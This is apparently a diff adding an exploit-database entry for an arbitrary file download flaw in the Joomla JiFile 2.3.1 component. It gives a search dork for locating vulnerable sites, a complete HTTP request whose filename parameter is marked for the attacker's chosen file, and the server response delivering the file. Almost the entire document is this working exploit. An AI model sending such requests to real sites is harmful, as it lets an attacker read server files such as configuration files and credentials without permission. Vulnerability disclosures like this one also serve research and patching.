@@ -1,0 +1,40 @@
+# Exploit Title: Joomla! Component JiFile 2.3.1 - Arbitrary File Download
+# Exploit Author: Mr Winst0n
+# Author E-mail: manamtabeshekan@gmail.com
+# Discovery Date: April 28, 2019
+# Vendor Homepage: http://www.isapp.it
+# Software Link : https://extensions.joomla.org/extensions/extension/search-a-indexing/site-search/jifile/
+# Dork: inurl:index.php?option=com_jifile
+# Tested Version: 2.3.1
+# Tested on: Kali linux, Windows 8.1 
+
+
+# PoC:
+
+
+GET /web/index.php?option=com_jifile&task=filesystem.download&filename=index.php HTTP/1.1  <== YOUR FILE HERE
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: 7a9abe45881a5cc968ac0e7c857d8a72=6a377b3429e0b0c22c3abb8f3a078534
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+
+HTTP/1.1 200 OK
+Date: Sun, 28 Apr 2019 17:37:16 GMT
+Server: Apache
+Pragma: public
+Cache-Control: must-revalidate, post-check=0, pre-check=0
+Expires: 0
+Content-Transfer-Encoding: binary
+Content-Disposition: attachment; filename="index.php"; modification-date="1418190008"; size=1319;
+Set-Cookie: c90ff18cda17f7cf5069ad1e830756c6=9a1f1c7e9bc241c66e7ad65ca0dd7624; path=/; secure
+Content-Length: 1319
+Connection: close
+Content-Type: application/x-php
+
+FILE_CONTENT
